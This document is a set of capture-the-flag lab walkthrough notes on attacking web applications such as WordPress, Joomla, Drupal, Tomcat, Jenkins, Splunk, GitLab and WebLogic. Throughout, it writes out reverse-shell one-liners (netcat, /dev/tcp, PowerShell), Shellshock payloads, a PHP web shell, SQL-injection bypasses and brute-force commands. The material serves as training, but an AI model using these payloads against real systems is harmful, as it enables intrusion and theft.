### question: Use what you've learned from this section to generate a report with EyeWitness. What is the name of the .db file EyeWitness creates in the inlanefreight_eyewitness folder? (Format: filename.db)

```bash
sudo nano /etc/hosts
# Edit hosts file to map target IP to required virtual hosts

94.237.59.242 app.inlanefreight.local dev.inlanefreight.local drupal-dev.inlanefreight.local drupal-qa.inlanefreight.local drupal-acc.inlanefreight.local drupal.inlanefreight.local blog.inlanefreight.local
```

```bash
nano vhosts.txt
# Create a file containing all virtual hosts for scanning

http://app.inlanefreight.local
http://dev.inlanefreight.local
http://drupal-dev.inlanefreight.local
http://drupal-qa.inlanefreight.local
http://drupal-acc.inlanefreight.local
http://drupal.inlanefreight.local
http://blog.inlanefreight.local
```

```bash
eyewitness --web -f vhosts.txt -d inlanefreight_eyewitness
# Run EyeWitness against the vhost list and save output to the specified directory
```

```bash
ls inlanefreight_eyewitness
# List contents to identify the generated SQLite .db file
```

---

### question: What does the header on the title page say when opening the aquatone_report.html page with a web browser? (Format: 3 words, case sensitive)

```bash
cat vhosts.txt | aquatone -out inlanefreight_aquatone
# Generate Aquatone report from the virtual host list
```

```bash
firefox inlanefreight_aquatone/report.html
# Open the Aquatone HTML report to read the title header
```

---

### question: Enumerate the host and find a flag.txt flag in an accessible directory.

```bash
echo "10.129.59.242 blog.inlanefreight.local" | sudo tee -a /etc/hosts
sudo wpscan --url http://blog.inlanefreight.local \
--enumerate vp,vt,u \
--api-token token
# Enumerate WordPress plugins, themes, and users
```

```text
http://blog.inlanefreight.local/wp-content/uploads/2021/08/flag.txt
# Direct path to the discovered flag file
```

---

### question: Perform manual enumeration to discover another installed plugin. Submit the plugin name as the answer (3 words).

```text
Ctrl + U
# View page source to inspect loaded WordPress plugins
```

```text
/find /plugins/
# Search within the source for plugin directory references
```

---

### question: Find the version number of this plugin. (i.e., 4.5.2)

```text
http://blog.inlanefreight.local/wp-content/plugins/wp-sitemap-page/readme.txt
# Read the plugin readme file to determine the version
```

---

### question: Perform user enumeration against [http://blog.inlanefreight.local](http://blog.inlanefreight.local). Aside from admin, what is the other user present?

```bash
wpscan --url http://blog.inlanefreight.local --enumerate u
# Enumerate WordPress users
```

---

### question: Perform a login bruteforcing attack against the discovered user. Submit the user's password as the answer.

```bash
wpscan --url http://blog.inlanefreight.local -U doug -P /usr/share/wordlists/rockyou.txt
# Bruteforce WordPress login for user doug
```

---

### question: Using the methods shown in this section, find another system user whose login shell is set to /bin/bash.

```text
webadmin:x:1001:1001::/home/webadmin:/bin/bash
# System user entry showing /bin/bash as the login shell
```

---

### question: Following the steps in this section, obtain code execution on the host and submit the contents of the flag.txt file in the webroot.

```bash
nano wp_discuz.py
# Paste exploit code from Exploit-DB ID 49967
```

```bash
python3 ./wp_discuz.py -u http://blog.inlanefreight.local -p /?p=1
# Exploit vulnerable plugin to upload a web shell
```

```bash
curl -s http://blog.inlanefreight.local/wp-content/uploads/2026/01/wmhnehufkszhwou-1768295926.8133.php?cmd=cat+/var/www/blog.inlanefreight.local/flag_d8e8fca2dc0f896fd7cb4cb0031ba249.txt
# Execute command via web shell to read the flag
```

---

### question: Fingerprint the Joomla version in use on [http://app.inlanefreight.local](http://app.inlanefreight.local) (Format: x.x.x)

```bash
cmseek -u http://app.inlanefreight.local
# Detect CMS and extract Joomla version information
```

---

### question: Find the password for the admin user on [http://app.inlanefreight.local](http://app.inlanefreight.local)

```bash
sudo python3 joomla-brute.py \
-u http://app.inlanefreight.local \
-w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt \
-usr admin
# Bruteforce Joomla admin credentials
```

---

### question: Leverage the directory traversal vulnerability to find a flag in the web root of the [http://dev.inlanefreight.local/](http://dev.inlanefreight.local/) Joomla application

```text
admin:admin
# Valid Joomla administrator credentials
```

```text
http://dev.inlanefreight.local/administrator
# Joomla administrator login page
```

```text
http://dev.inlanefreight.local/administrator/index.php?option=com_plugins
# Disable problematic plugin if backend error occurs
```

```php
system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);
# PHP one-liner added to template file for command execution
```

```bash
curl -s http://dev.inlanefreight.local/templates/protostar/error.php?dcfdd5e021a869fcc6dfaef8bf31377e=cat+/var/www/dev.inlanefreight.local/flag_6470e394cbf6dab6a91682cc8585059b.txt
# Trigger RCE and read the Joomla flag
```

---

### question: Identify the Drupal version number in use on [http://drupal-qa.inlanefreight.local](http://drupal-qa.inlanefreight.local)

```bash
curl -s http://drupal-qa.inlanefreight.local/CHANGELOG.txt | grep -m2 ""
# Retrieve Drupal version information from the changelog file
```

---

### question: Work through all of the examples in this section and gain RCE multiple ways via the various Drupal instances on the target host. When you are done, submit the contents of the flag.txt file in the /var/www/drupal.inlanefreight.local directory.

```bash
python2.7 drupalgeddon.py -t http://drupal-qa.inlanefreight.local -u hacker -p pwnd
# Exploit Drupal vulnerability to create a privileged user
```

```text
hacker / pwnd
# Credentials used to authenticate to Drupal
```

```bash
sudo ufw allow from any to any port 4444 proto tcp
# Allow inbound connections for reverse shell
```

```bash
set RHOSTS [Target_IP]
set VHOST drupal-qa.inlanefreight.local
set LHOST tun0
set PAYLOAD php/meterpreter/reverse_tcp
set PROXIES HTTP:127.0.0.1:8080
set HttpUsername hacker
set HttpPassword pwnd
exploit
# Metasploit configuration for authenticated Drupal RCE
```

```bash
cat ../drupal.inlanefreight.local/flag_6470e394cbf6dab6a91682cc8585059b.txt
# Read the final Drupal flag
```

---

### question: What version of Tomcat is running on the application located at [http://web01.inlanefreight.local:8180](http://web01.inlanefreight.local:8180)?

```bash
curl -s http://web01.inlanefreight.local:8180/docs/ | grep Tomcat
# Identify Tomcat version from documentation page
```

---

### question: Perform a login bruteforcing attack against Tomcat manager at [http://web01.inlanefreight.local:8180](http://web01.inlanefreight.local:8180). What is the valid username? What is the password?

```bash
use auxiliary/scanner/http/tomcat_mgr_login
# Load Metasploit Tomcat manager login scanner
```

```bash
set VHOST web01.inlanefreight.local
set RPORT 8180
set RHOSTS 10.129.201.58
run
# Execute bruteforce attack against Tomcat manager
```

---

### question: Obtain remote code execution on the [http://web01.inlanefreight.local:8180](http://web01.inlanefreight.local:8180) Tomcat instance. Find and submit the contents of tomcat_flag.txt

```bash
wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp
# Download JSP web shell
```

```bash
zip -r backup.war cmd.jsp
# Package JSP shell into a WAR archive
```

```bash
curl http://web01.inlanefreight.local:8180/backup/cmd.jsp?cmd=cat+/opt/tomcat/apache-tomcat-10.0.10/webapps/tomcat_flag.txt
# Execute command through deployed WAR file to read the flag
```

---

### question: Attack the Jenkins target and gain remote code execution. Submit the contents of the flag.txt file in the /var/lib/jenkins3 directory

```groovy
def cmd = 'cat flag.txt'
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = cmd.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println sout
# Groovy script executed in Jenkins Script Console for RCE
```

---

### question: Enumerate the Splunk instance as an unauthenticated user. Submit the version number to move on (format 1.2.3).

```text
https://10.129.248.182:8000/en-US/account/login?return_to=%2Fen-US%2F
# Access Splunk login page to identify version information
```

---

### question: Attack the Splunk target and gain remote code execution. Submit the contents of the flag.txt file in the c:\loot

```bash
git clone https://github.com/0xjpuff/reverse_shell_splunk.git
# Clone Splunk reverse shell exploit repository
```

```bash
$client = New-Object System.Net.Sockets.TCPClient('YOUR_IP',443);$stream = $client.GetStream();[byte[]]$bytes >
# Modify PowerShell reverse shell payload
```

```bash
tar -cvzf reverse_shell_splunk.tgz reverse_shell_splunk/
# Package exploit as a Splunk application archive
```

```bash
sudo nc -lvnp 443
# Start a Netcat listener for the reverse shell
```

```text
Install app from file via Splunk UI
# Upload the malicious Splunk app through the web interface
```

```bash
cat ..\..\loot\flag.txt
# Read the flag from the loot directory
```

---

### question: What version of PRTG is running on the target?

```bash
curl -s http://10.129.248.182:8080/index.htm \
-A "Mozilla/5.0 (compatible; MSIE 7.01; Windows NT 5.0)" | grep version
# Extract PRTG version using a legacy user-agent
```

---

### question: Attack the PRTG target and gain remote code execution. Submit the contents of the flag.txt file on the administrator Desktop.

```bash
sudo nmap -sV -p- --open -T4 -oA web_discovery 10.129.248.182
# Perform full port scan and service detection
```

```bash
eyewitness --web -x web_discovery.xml -d prtg_eyewitness
# Generate EyeWitness screenshots from scan results
```

```text
Login: prtgadmin / Password123
# Authenticate to the PRTG web interface
```

```text
Create notification with EXECUTE PROGRAM enabled
# Abuse PRTG notification feature for command execution
```

```bash
sudo crackmapexec smb 10.129.248.182 -u prtgadm1 -p Pwn3d_by_PRTG!
# Validate newly created administrative SMB credentials
```

```bash
smbclient \\\\10.129.248.182\\C$ -U prtgadm1
# Connect to the administrative SMB share
```

```bash
get Users\administrator\Desktop\flag.txt
# Download the final PRTG flag
```

### **question: Find your way into the osTicket instance and submit the password sent from the Customer Support Agent to the customer Charles Smithson.**

vhost support.inlanefreight.local

> visit support.inlanefreight.local
> sign in
> sign in as agent
> login cred `kevin@inlanefreight.local:Fish1ng_s3ason!`
> click Users
> click Charles Smithson
> click ticket **"VPN password reset"**
> scroll down
> found password

---

### **question: Enumerate the GitLab instance at [http://gitlab.inlanefreight.local](http://gitlab.inlanefreight.local). What is the version number?**

vhost gitlab.inlanefreight.local

> visit gitlab.inlanefreight.local
> click Register now
> fill out the form
> logged in
> visit [http://gitlab.inlanefreight.local:8081/help](http://gitlab.inlanefreight.local:8081/help)
> found version

---

### **question: Find the PostgreSQL database password in the example project.**

> visit
> [http://gitlab.inlanefreight.local:8081/root/inlanefreight-dev/-/blob/master/phpunit_pgsql.xml](http://gitlab.inlanefreight.local:8081/root/inlanefreight-dev/-/blob/master/phpunit_pgsql.xml)
> found password

---

### **question: Find another valid user on the target GitLab instance.**

```bash
# Enumerate GitLab users using a large username wordlist
python3 gitlab_userenum.py \
--url http://gitlab.inlanefreight.local:8081/ \
--userlist /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
```

---

### **question: Gain remote code execution on the GitLab instance. Submit the flag in the directory you land in.**

```bash
# Copy the GitLab RCE exploit code
# Source: https://www.exploit-db.com/exploits/49951

nano gitlab_rce.py
# Paste the exploit code into the file
```

```bash
# Start a Netcat listener for reverse shell
nc -nlvp 4444
```

```bash
# Execute the GitLab RCE exploit to gain a reverse shell
python3 gitlab_rce.py \
-t http://gitlab.inlanefreight.local:8081 \
-u mrb3n \
-p password1 \
-c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.15.67 4444 >/tmp/f'
```

```bash
# Read the flag after successful exploitation
cat flag_gitlab.txt
```

---

### **question: After running the URL Encoded 'whoami' payload, what user is tomcat running as?**

```bash
# Fuzz for CGI scripts on the server
ffuf -w /usr/share/dirb/wordlists/common.txt \
-u http://10.129.110.167:8080/cgi/FUZZ.bat
```

```text
# Test basic CGI endpoint
http://10.129.204.227:8080/cgi/welcome.bat?&set
```

```text
# Execute whoami using Windows path
http://10.129.204.227:8080/cgi/welcome.bat?&c:\windows\system32\whoami.exe
```

```text
# URL-encoded whoami payload
http://10.129.110.167:8080/cgi/welcome.bat?&c:%5Cwindows%5Csystem32%5Cwhoami.exe
```

---

### **question: Enumerate the host, exploit the Shellshock vulnerability, and submit the contents of the flag.txt file located on the server.**

```bash
# Enumerate CGI directories and scripts
gobuster dir \
-u http://10.129.204.231/cgi-bin/ \
-w /usr/share/wordlists/dirb/small.txt \
-x cgi
```

```bash
# Test access to discovered CGI script
curl -i http://10.129.204.231/cgi-bin/access.cgi
```

```bash
# Test Shellshock vulnerability by reading /etc/passwd
curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' \
http://10.129.204.231/cgi-bin/access.cgi
```

```bash
# Start Netcat listener for reverse shell
sudo nc -lvnp 7777
```

```bash
# Exploit Shellshock to get a reverse shell
curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.14.38/7777 0>&1' \
http://10.129.204.231/cgi-bin/access.cgi
```

```bash
# Read the flag file on the compromised server
cat flag.txt
```

### Question: Perform an analysis of `C:\Apps\Restart-OracleService.exe` and identify the credentials hidden within its source code. Submit the answer using the format `username:password`.

#### Steps:

1. **Connect via RDP**

```bash
xfreerdp3 /u:cybervaca /p:'&aue%C)}6g-d{w' /v:10.129.52.0 /dynamic-resolution
# Connect to the target Windows machine as cybervaca
```

2. **Monitor process activity**

* Open `C:\TOOLS\ProcessMonitor\Procmon64.exe`
* Filter: Process Name is `Restart-OracleService.exe` → Include
* Apply filter

3. **Change permissions on Temp folder to prevent automatic deletion**

* Right-click `C:\Users\cybervaca\AppData\Local\Temp` → Properties → Security → Advanced → cybervaca → Disable inheritance → Convert inherited permissions into explicit permissions → Edit → Show advanced permissions → deselect Delete subfolders/files and Delete checkboxes → OK → Apply → OK → OK

4. **Run the service and capture files**

* Rerun `Restart-OracleService.exe`
* Navigate to `C:\Users\cybervaca\AppData\Local\Temp\2`
* Edit `FTA.bat`

```bat
# Delete these lines to prevent cleanup
del c:\programdata\monta.ps1
del c:\programdata\oracle.txt
del c:\programdata\restart-service.exe
```

5. **Analyze extracted files**

* `oracle.txt` contains base64 lines
* `monta.ps1` reads `oracle.txt` and decodes to `restart-service.exe`

```bash
cat C:\programdata\monta.ps1
# View the script that decodes oracle.txt into restart-service.exe
```

6. **Analyze the executable**

* Navigate to `C:\TOOLS\xdgb\release\x64` → Open → Options → Preferences → uncheck all except Exit Breakpoint
* File → Open → Select `restart-service.exe`
* CPU View → Right-click → Follow in Memory Map

7. **Identify mapped memory region**

* Map size: `0000000000003000`
* Type: MAP
* Protection: -RW--

8. **Export memory and analyze**

* Double-click map → Check ASCII column for `MZ` header
* Right-click → Dump Memory to File

```bash
C:\TOOLS\Strings\strings64.exe .\restart-service_00000000001E0000.bin
# Extract readable strings from the dumped memory
```

```bash
C:\TOOLS\de4dot\de4dot.exe .\restart-service_00000000001E0000.bin
# Clean .NET obfuscated executable
```

* Open cleaned binary in dnSpy → Check `runas` folder → Main function → Extract username and password

---

### Question: The first select query fails, while the second returns valid user results with the role admin and the password abc. The password sent to the server is also abc, which results in a successful password comparison, and the application allows us to log in as the user admin.

#### Steps:

1. **Run the client application**

* Double-click `fatty-client.jar`

2. **Login attempt**

* Credentials: `qtc / clarabibi`
* Connection Error observed → Port likely incorrect (default 8000 → change to 1337)

3. **Capture network traffic**

* Run Wireshark → Determine correct port → ipconfig on `Ethernet 1`
* Retry login

4. **Extract and edit JAR file**

```bash
# Extract contents of fatty-client.jar
Right-click → Extract files
```

* Run PowerShell as administrator → Search for port 8000

```powershell
ls fatty-client\ -recurse | Select-String "8000" | Select Path, LineNumber | Format-List
```

* Found in `beans.xml` → Edit constructor-arg value to 1337

```xml
<constructor-arg index="1" value="1337"/>
<property name="secret" value="clarabibiclarabibiclarabibi"/>
```

5. **Bypass SHA-256 validation**

* Remove hashes from `META-INF/MANIFEST.MF`
* Delete `1.RSA` and `1.SF` files

6. **Rebuild JAR**

```bash
cd .\fatty-client
jar -cmf .\META-INF\MANIFEST.MF ..\fatty-client-new.jar *
# Recreate the signed JAR without hashes
```

7. **Run modified JAR**

* Double-click `fatty-client-new.jar`
* Login: `qtc / clarabibi`

8. **Explore file system**

* FileBrowser → Whoami → Check user role
* FileBrowser → Notes.txt → `security.txt`
* FileBrowser → Mail → `dave.txt`

9. **Attempt path traversal**

```text
../../../../../../etc/passwd
# Server filters out / characters
```

10. **Decompile JAR for source analysis**

* Use JD-GUI → Save All Sources → Extract
* `htb/fatty/client/methods/Invoker.java` → Shows showFiles and open functions

11. **Edit Invoker.java to download server JAR**

```java
FileOutputStream fos = new FileOutputStream(desktopPath);
byte[] content = this.response.getContent();
fos.write(content);
fos.close();
```

12. **Rebuild JAR and login**

* Extract directory → Compile `ClientGuiTest.java` → Repackage as `traverse.jar`
* Navigate to FileBrowser → Config → Open `fatty-server.jar`

13. **Analyze server JAR**

* Decompile `htb/fatty/server/database/FattyDbSession.class` → `checkLogin()` function
* Observe SQL query and password hashing

```java
sha256(username + password + "clarabibimakeseverythingsecure")
```

14. **Exploit SQL injection**

* Inject `abc' UNION SELECT 1,'abc','a@b.com','abc','admin` → Password `abc`
* Login as admin successful

15. **Server status check**

* ServerStatus → ipconfig → Confirm successful connection

Here’s your content **structured and organized**, with typos fixed, commands commented, and all steps kept intact. I kept everything verbatim aside from obvious spelling corrections.

---

### Question: What user is ColdFusion running as

#### Steps:

1. **Port scan**

```bash
nmap -sV -p 1-1000 -Pn --open 10.129.20.114
# Identify open ports on target
```

2. **Access ColdFusion Administrator**

* Visit: `http://10.129.20.114:8500/CFIDE/administrator/`
* Notice ColdFusion version 8 is running

3. **Search for exploits**

```bash
searchsploit adobe coldfusion
searchsploit -p 50057
cp /usr/share/exploitdb/exploits/cfm/webapps/50057.py .
nano 50057.py
# Modify the exploit for target parameters
```

4. **Set exploit parameters in 50057.py**

```python
if __name__ == '__main__':
    lhost = '10.10.14.55'  # HTB VPN IP
    lport = 4444            # Local port
    rhost = "10.129.247.30" # Target IP
    rport = 8500            # Target port
    filename = uuid.uuid4().hex
```

5. **Start listener and run exploit**

```bash
nc -lnvp 4444
python3 50057.py
whoami
# Found ColdFusion user
```

---

### Question: What is the full .aspx filename that Gobuster identified?

1. **Scan for short names**

```bash
cd IIS-ShortName-Scanner/release/
java -jar iis_shortname_scanner.jar 0 5 http://10.129.204.231/
```

2. **Gobuster scan**

```bash
gobuster dir -u http://10.129.77.59/ -w /tmp/list.txt -x .aspx,.asp
# Identify full .aspx filenames
```

---

### Question: After bypassing the login, what is the website "Powered by"?

1. **Scan target ports**

```bash
nmap -sV -p 1-1000 -Pn --open 10.129.20.114
```

2. **Bypass login**

* Visit: `http://10.129.20.114`
* Username: `*`
* Password: `dummy` (or vice versa)
* Check footer for “Powered by” text

---

### Question: Find the crucial parameter in Asset Manager app

1. **SSH to target**

```bash
ssh root@10.129.205.15
# Password: !x4;EW[ZLwmDx?=w
```

2. **View source code**

```bash
cat /opt/asset-manager/app.py
# Identify the parameter name needed to log in
```

---

### Question: What credentials were found for the local database instance while debugging octopus_checker? (Format username:password)

1. **SSH into target**

```bash
ssh htb-student@10.129.205.15
# Password: HTB_@cademy_stdnt!
```

2. **Start GDB**

```bash
gdb ./octopus_checker
set disassembly-flavor intel
disas main
```

3. **Set breakpoint and run**

```bash
gdb-peda$ b *0x5555555551b0
gdb-peda$ run
# Observe RDX
RDX: 0x7fffffffdf30 ("DRIVER={ODBC Driver 17 for SQL Server};SERVER=localhost, 1401;UID=SA;PWD=N0tS3cr3t!;")
```

* Credentials: `SA:N0tS3cr3t!`

---

### Question: Enumerate Oracle WebLogic for RCE and read Administrator flag.txt

1. **Scan ports**

```bash
sudo nmap -sV 10.129.76.189 -p 1-10000 --open
```

2. **Access login**

* Visit: `http://10.129.201.102:7001/console/login/LoginForm.jsp`
* Oracle WebLogic Server version: `12.2.1.3.0`

3. **Download and run exploit**

```bash
searchsploit oracle
cp /usr/share/exploitdb/exploits/java/webapps/49479.py .
python3 49479.py -u http://10.129.201.102:7001
# Access Administrator Desktop
type ..\..\..\..\..\..\Users\Administrator\Desktop\flag.txt
# Flag: w3b_l0gic_RCE!
```

---

### Question: Vulnerable application and port (Tomcat CGI)

1. **Scan target**

```bash
sudo nmap -sV 10.129.76.189 -p 1-10000 --open
```

2. **Fuzz for CGI scripts**

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.129.76.189:8080/cgi/FUZZ.bat -ac -ic
```

3. **Exploit with Metasploit**

```bash
msfconsole
use exploit/windows/http/tomcat_cgi_cmdlineargs
set RHOST 10.129.156.162
set LHOST 10.10.14.115
set TARGETURI /cgi/cmd.bat
set ForceExploit true
run
cat C:/Users/Administrator/Desktop/flag.txt
```

---

### Question: WordPress instance URL

1. **DNS subdomain enumeration**

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://10.129.132.218 -H "Host: FUZZ.inlanefreight.local" -mc 200 -fs 0 -fl 923
```

---

### Question: Public GitLab project

* Visit: `http://gitlab.inlanefreight.local:8180/root/virtualhost`

---

### Question: FQDN of the third vhost

* `http://gitlab.inlanefreight.local:8180/root/virtualhost/-/blob/master/README.md`

---

### Question: Application on the third vhost (one word)

* `monitoring`
* Visit: `http://monitoring.inlanefreight.local/`

---

### Question: Admin password to access this application

* Visit: `http://gitlab.inlanefreight.local:8180/root/nagios-postgresql/-/blob/master/INSTALL`
* Password: `nagiosadmin:oilaKglm7M09@CPL&^lC`

---

### Question: Obtain reverse shell and retrieve flag

1. **Download exploit**

```bash
cp /usr/share/exploitdb/exploits/49422.py .
nano nagiosxi-rce.py
```

2. **Run exploit**

```bash
python3 nagiosxi-rce.py http://monitoring.inlanefreight.local nagiosadmin 'oilaKglm7M09@CPL&^lC' 10.10.14.115 443
nc -lvnp 443
cat f5088a862528cbb16b4e253f1809882c_flag.txt
```

---

### Question: Hardcoded database password in MultimasterAPI.dll

1. **Connect via RDP**

```bash
xfreerdp3 /u:Administrator /p:'xcyj8izxNVzhf4z' /v:10.129.166.34 /dynamic-resolution
```

2. **Open DLL in dnSpy**

* Navigate to: `C://TOOLS/dnsSpy/dnSpy.exe`
* File → Open → `C:\inetpub\wwwroot\bin\MutimasterAPI.dll`
* Inspect function: `GetColleagues(JObject):List<Colleague>@060000027`
* Extract hardcoded password
